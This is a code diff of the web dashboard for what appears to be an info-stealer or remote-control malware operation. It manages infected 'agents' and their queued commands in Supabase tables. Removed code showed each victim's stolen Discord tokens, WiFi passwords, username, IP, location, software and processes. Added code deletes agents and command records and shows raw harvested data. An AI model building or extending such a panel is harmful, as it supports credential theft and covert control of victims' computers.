+    document.getElementById('cmd-output').innerHTML = '> Ready.';
 }
 
-async function showDetail(id) {
-  const report = allReports.find(r => r.id == id);
-  if (!report) return;
-  const raw = report.raw_specs || {};
-  document.getElementById('modal-content').innerHTML = `
-    <strong>🖥️ PC</strong> ${escapeHtml(report.pc_name)}<br>
-    <strong>👤 User</strong> ${escapeHtml(report.username)}<br>
-    <strong>🆔 ID</strong> ${escapeHtml(report.visitor_id)}<br>
-    <strong>🌍 IP</strong> ${escapeHtml(report.public_ip || report.local_ip)}<br>
-    <strong>💿 OS</strong> ${escapeHtml(raw.os || report.platform)}<br>
-    <strong>🧠 CPU</strong> ${escapeHtml(raw.cpu_name)} (${raw.cpu_cores || report.cpu_cores} cores)<br>
-    <strong>💾 RAM</strong> ${raw.ram_gb || report.memory_gb} GB<br>
-    <strong>🎮 GPU</strong> ${escapeHtml(raw.gpu || 'Unknown')}<br>
-    <strong>💽 Disk</strong> ${raw.disk_gb || '?'} GB<br>
-    <strong>📍 Location</strong> ${escapeHtml(raw.location || 'Unknown')}<br>
-    <strong>🔑 Discord Tokens (${(raw.discord_tokens || []).length})</strong><br><pre>${escapeHtml(JSON.stringify(raw.discord_tokens || [], null, 2))}</pre>
-    <strong>📶 WiFi Passwords (${(raw.wifi_passwords || []).length})</strong><br><pre>${escapeHtml(JSON.stringify(raw.wifi_passwords || [], null, 2))}</pre>
-    <strong>💿 Software (${(raw.software || []).length})</strong><br><pre>${escapeHtml((raw.software || []).slice(0,15).join('\n'))}</pre>
-    <strong>⚙️ Processes (${(raw.processes || []).length})</strong><br><pre>${escapeHtml((raw.processes || []).slice(0,15).join('\n'))}</pre>
-    <details><summary>📦 Full JSON</summary><pre>${escapeHtml(JSON.stringify(raw, null, 2))}</pre></details>
-  `;
-  document.getElementById('modal-detail').classList.add('open');
+// Delete functions
+async function promptDeleteAgent(visitorId, pcName) {
+    pendingDeleteId = visitorId;
+    pendingDeleteAll = false;
+    document.getElementById('delete-message').innerHTML = `Delete agent <strong>${escapeHtml(pcName)}</strong> and all its data?<br>This cannot be undone.`;
+    document.getElementById('delete-modal').style.display = 'flex';
 }
 
-function closeModal() { document.getElementById('modal-detail').classList.remove('open'); }
-function closeModalOnBg(e) { if (e.target === document.getElementById('modal-detail')) closeModal(); }
-function toast(msg) { const el = document.getElementById('toast'); el.textContent = msg; el.classList.add('show'); setTimeout(() => el.classList.remove('show'), 2500); }
-function escapeHtml(str) { if (!str) return ''; return String(str).replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[m])); }
-init();
+async function deleteAllFiltered() {
+    if (filteredAgents.length === 0) return;
+    pendingDeleteAll = true;
+    pendingDeleteId = null;
+    document.getElementById('delete-message').innerHTML = `Delete <strong>${filteredAgents.length}</strong> agents?<br>This cannot be undone.`;
+    document.getElementById('delete-modal').style.display = 'flex';
+}
+
+async function confirmDelete() {
+    if (pendingDeleteId) {
+        // Delete single agent
+        const { error: deleteReports } = await sb.from('pc_reports').delete().eq('visitor_id', pendingDeleteId);
+        const { error: deleteCommands } = await sb.from('pc_commands').delete().eq('command_for', pendingDeleteId);
+        
+        if (!deleteReports && !deleteCommands) {
+            toast(`Agent deleted`);
+            if (selectedAgent === pendingDeleteId) {
+                selectedAgent = null;
+                document.getElementById('cmd-panel').style.display = 'none';
+            }
+            await fetchAgents();
+        } else {
+            toast('Delete failed');
+        }
+        pendingDeleteId = null;
+    } else if (pendingDeleteAll) {
+        // Delete all filtered agents
+        const ids = filteredAgents.map(a => a.visitor_id);
+        let deleted = 0;
+        for (const id of ids) {
+            await sb.from('pc_reports').delete().eq('visitor_id', id);
+            await sb.from('pc_commands').delete().eq('command_for', id);
+            deleted++;
+        }
+        toast(`Deleted ${deleted} agents`);
+        if (selectedAgent && ids.includes(selectedAgent)) {
+            selectedAgent = null;
+            document.getElementById('cmd-panel').style.display = 'none';
+        }
+        await fetchAgents();
+        pendingDeleteAll = false;
+    }
+    closeDeleteModal();
+}
+
+async function deleteAgent() {
+    if (selectedAgent) {
+        promptDeleteAgent(selectedAgent, document.getElementById('target-name').innerHTML);
+    }
+}
+
+function closeDeleteModal() {
+    document.getElementById('delete-modal').style.display = 'none';
+    pendingDeleteId = null;
+    pendingDeleteAll = false;
+}
+
+// Detail modal
+async function showAgentDetail(id) {
+    const agent = agents.find(a => a.id == id);
+    if (!agent) return;
+    const raw = agent.raw_specs || {};
+    document.getElementById('detail-content').innerHTML = `
+        <pre>${escapeHtml(JSON.stringify(raw, null, 2))}</pre>
+    `;
+    document.getElementById('detail-modal').style.display = 'flex';
+}
+
+function closeDetailModal() {
+    document.getElementById('detail-modal').style.display = 'none';
+}
+
+// Utilities
+function toast(msg) {
+    const t = document.getElementById('toast');
+    t.innerText = msg;
+    t.style.display = 'block';
+    setTimeout(() => t.style.display = 'none', 3000);
+}
+
+function escapeHtml(str) {
+    if (!str) return '';
+    return String(str).replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[m]));
+}
+
+// Start
+checkSession();
 </script>
 </body>
 </html>
